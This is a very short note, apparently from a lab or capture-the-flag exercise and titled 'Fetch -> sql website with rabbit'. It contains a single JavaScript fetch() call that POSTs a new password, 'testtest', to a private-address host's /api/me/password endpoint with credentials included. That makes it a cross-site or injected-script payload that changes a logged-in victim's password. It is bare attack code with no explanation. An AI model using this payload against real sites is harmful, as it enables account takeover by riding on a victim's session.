Fetch -> sql website with rabbit

fetch("https://192.168.62.62:8443/api/me/password", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
  },
  body: "password=testtest",
  credentials: "include"
});
